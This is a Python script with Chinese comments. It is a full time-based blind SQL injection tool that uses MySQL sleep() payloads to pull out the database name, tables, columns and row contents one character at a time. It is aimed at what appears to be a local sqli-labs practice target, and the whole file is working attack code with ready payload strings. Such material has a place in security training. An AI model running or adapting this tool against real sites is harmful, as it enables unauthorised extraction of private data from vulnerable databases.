# coding:utf-8
import requests
import argparse
import time

#获取数据库名函数
def GetDBName(url,len_payload,dbname_payload):
    print("[-] 开始获取数据库的长度")
    DBNameLen = 0
    # 用于检查数据库长度的len_payload
    #把url和payload进行拼接，得到最终请求url
    targetUrl = url + len_payload
    print(targetUrl)

    #用for循环遍历请求，得到数据库名的长度
    for DBNameLen in range(8,99):
        #对payload的中的参数进行赋值猜解
        start = time.time()
        requests.get(url=targetUrl.format(DBNameLen))
        end = time.time()
        #判断flag是否在返回的页面中
        if end - start > 3:
            print("[+] 数据库名的长度："+ str(DBNameLen))
            break

    print("[-] 开始获取数据库名")

    # 数据库名DBName
    DBName = ''
    # 获取数据库名的dbname_payload
    targetUrl2 = url + dbname_payload

    #a表示substr()函数的截取位置
    for a in range(1,DBNameLen+1):
        #b表示在ascii码中33～126 位可显示的字符
        for b in range(33,127):
            start = time.time()
            requests.get(targetUrl2.format(a,b))
            end = time.time()
            if end - start > 3:
                DBName += chr(b)
                print("[-]" + DBName)
                break

    return DBName

#获取数据库表函数
def GetDBTables(url, dbname,payload1,payload2,payload3):
    DBTables = []
    #存放数据库表数量的变量
    DBTableCount = 0
    print("[-] 开始获取 {} 数据库表数量：".format(dbname))
    #获取数据库表数量的payload1
    targetUrl = url + payload1
    #开始遍历获取数据库表的数量
    for DBTableCount in range(1,99):
        start = time.time()
        requests.get(targetUrl.format(dbname,DBTableCount))
        end = time.time()
        if end - start > 3:
            print("[+]{}数据库中表的数量为：{}".format(dbname,DBTableCount))
            break
    print("[-]开始获取{}数据库的表".format(dbname))
    #遍历表名时临时存放表名长度的变量
    tableLen = 0
    #a表示当前正在获取表的索引
    for a in range(0,DBTableCount):
        print("[-]正在获取第{}个表名".format(a+1))
        #先获取当前表名的长度
        for tableLen in range(1,99):
            targetUrl2 = url + payload2
            start = time.time()
            requests.get(targetUrl2.format(dbname,a,tableLen))
            end = time.time()
            if end - start > 3:
                break
        #开始获取表名
        #临时存放当前表名的变量
        table = ""
        #b表示当前表名猜解的位置（substr）
        for b in range(1,tableLen+1):
            targetUrl3 = url + payload3
            # c 表示在ascii码中33～126位可显示字符
            for c in range(33,127):
                start = time.time()
                requests.get(targetUrl3.format(dbname,a,b,c))
                end = time.time()
                if end - start > 3:
                    table +=chr(c)
                    print(table)
                    break
        #把获取到的表名加入DBTables
        DBTables.append(table)

    return DBTables

#获取数据库表字段的函数
def GetDBColumns(url,dbname,dbtable,payload1,payload2,payload3):
    DBColumns = []
    #存放字段数量的变量
    DBColumnCount = 0
    print("[-] 开始获取{0}数据表的字段数：".format(dbtable))
    for DBColumnCount in range(99):
        targetUrl = url + payload1
        start = time.time()
        requests.get(targetUrl.format(dbname,dbtable,DBColumnCount))
        end = time.time()
        if end - start > 3:
            print("[-]{} 数据表的字段数为：{}".format(dbtable,DBColumnCount))
            break
     #开始获取字段的名称
     #保存字段名的临时变量
    column = ""
    columnLen = 0
    # a 表示当前获取字段的索引
    for a in range(0,DBColumnCount):
        print("[-]正在获取第{} 个字段名".format(a+1))
        #先获取字段的长度
        for columnLen in range(99):
            targetUrl2 = url + payload2
            start = time.time()
            requests.get(targetUrl2.format(dbname,dbtable,a,columnLen))
            end = time.time()
            if end - start > 3:
                break
        #b表示当前字段名猜解的位置
        for b in range(1,columnLen+1):
                targetUrl3 = url + payload3
                #c 表示在ascii表的33～126位可显示字符
                for c in range(33,127):
                    start = time.time()
                    requests.get(targetUrl3.format(dbname,dbtable,a,b,c))
                    end = time.time()
                    if end - start > 3:
                        column += chr(c)
                        print(column)
                        break
                #把获取到的字段加入DBCloumns
        DBColumns.append(column)
        #清空column，用来继续获取下一个字段名
        column = ""

    return DBColumns

#获取表字段的函数
def GetDBData(url,dbtable,dbcolumn,payload1,payload2,payload3):
    DBData = {}
    #先获取字段的数据数量
    DBDataCount = 0
    print("[-]开始获取 {} 表 {} 字段的数据数量".format(dbtable,dbcolumn))
    for DBDataCount in range(99):
        targetUrl = url + payload1
        start = time.time()
        requests.get(targetUrl.format(dbcolumn,dbtable,DBDataCount))
        end = time.time()
        if end - start > 3:
            print("[-]{0}表{1}字段的数据数量为：{2}".format(dbtable,dbcolumn,DBDataCount))
            break
    for a in range(0,DBDataCount):
        print("[-] 正在获取{} 的 第{} 个数据".format(dbcolumn,a+1))
        #先获取这个数据的长度
        dataLen = 0
        for dataLen in range(99):
            targetUrl2 = url + payload2
            start = time.time()
            requests.get(targetUrl2.format(dbcolumn,dbtable,a,dataLen))
            end = time.time()
            if end - start > 3:
                print("[-]第{}个数据长度为：{}".format(a+1,dataLen))
                break
        #临时存放数据内容变量
        data = ""
        #开始获取数据具体内容
        #b表示当前数据内容的猜解的位置
        for b in range(1,dataLen+1):
            for c in range(33,127):
                targetUrl3 = url + payload3
                start = time.time()
                requests.get(targetUrl3.format(dbcolumn,dbtable,a,b,c))
                end = time.time()
                if end - start > 3:
                    data +=chr(c)
                    print(data)
                    break
        #放到以字段名为健，值为列表的字典中
        DBData.setdefault(dbcolumn,[]).append(data)

    return DBData

#入口，主函数
#盲注主函数
def StartSqli(url,l='and '):
    len_payload = l + "if(length(database())={},sleep(3.5),1)--+"
    dbname_payload = l + "if(ascii(substr(database(),{},1))={},sleep(3.5),1)--+"
    # dbname = GetDBName(url, len_payload, dbname_payload)

    payload1 = l + "if((select count(*)table_name from information_schema.tables where table_schema='{}')={},sleep(3.5),1)--+"
    payload2 = l + "if((select LENGTH(table_name) from information_schema.tables where table_schema='{}' limit {},1)={},sleep(3.5),1)--+"
    payload3 = l + "if(ascii(substr((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1))={},sleep(3.5),1)--+"
    # dbTables = GetDBTables(url, dbname, payload1, payload2,payload3)

    payload4 = l + "if((select count(column_name) from information_schema.columns where table_schema='{}' and table_name='{}')={},sleep(3.5),1)--+"
    payload5 = l + "if((select length(column_name) from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1)={},sleep(3.5),1)--+"
    payload6 = l + "if(ascii(substr((select column_name from information_schema.columns where table_schema='{}' and table_name='{}' limit {},1),{},1))={},sleep(3.5),1)--+"
    # dbColumns = GetDBColumns(url, dbname, dbTables[0],payload4,payload5,payload6)

    payload7 = l + "if((select count({}) from {})={},sleep(3.5),1)--+"
    payload8 = l + "if((select length({}) from {} limit {},1)={},sleep(3.5),1)--+"
    payload9 = l + "if(ascii(substr((select {} from {} limit {},1),{},1))={},sleep(3.5),1)--+"
    # getdbData = GetDBData(url, dbTables[0],dbColumns[1], payload7, payload8, payload9)

    payloads = [len_payload, dbname_payload, payload1, payload2, payload3, payload4, payload5,
                payload6, payload7, payload8, payload9]

    DBName = GetDBName(url,payloads[0],payloads[1])
    print("[+]当前数据库名：{}".format(DBName))
    DBTables = GetDBTables(url,DBName,payloads[2],payloads[3],payloads[4])
    print("[+] 数据库 {} 的表如下：".format(DBName))
    for item in range(len(DBTables)):
        print("(" + str(item + 1 ) + ")" + DBTables[item])
    tableIndex = int(input("[*] 请输入要查看的表的序号 :")) - 1
    DBColumns = GetDBColumns(url,DBName,DBTables[tableIndex],payloads[5],payloads[6],payloads[7])
    while True:
        print("[+] 数据表 {} 的字段如下:".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("(" + str(item + 1) + ")" + DBColumns[item])
        columnIndex = int(input("[*] 请输入 要查看的字段的序号(输入0退出):")) - 1
        if(columnIndex == -1):
            break
        else:
            getdbData = GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex],payloads[8],payloads[9],payloads[10])
            print(getdbData)

if __name__ == '__main__':
    # 初始化参数构造器
    # parser = argparse.ArgumentParser()
    # # 在参数构造器中添加命令行参数
    # parser.add_argument('--url', type=str, default="http://192.168.88.136:5569/Less-8/?id=1' ")
    # # 获取所有的命令行参数
    # args = parser.parse_args()
    #
    # StartSqli(args.url)

    url = 'http://192.168.88.136:5569/Less-10/?id=1" '
    StartSqli(url)

